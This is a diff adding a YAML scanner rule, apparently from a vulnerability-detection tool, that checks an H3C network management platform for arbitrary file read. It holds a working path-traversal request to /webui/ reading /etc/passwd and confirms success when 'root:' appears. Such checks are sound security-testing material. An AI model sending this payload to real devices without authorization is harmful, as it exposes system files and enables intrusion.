@@ -1,0 +1,11 @@
+name: H3C-网管平台
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /webui/?file_name=../../../../../etc/passwd&g=sys_corefile_sysinfo_download
+    expression:
+      status: 200
+      body_all: ["root:"]
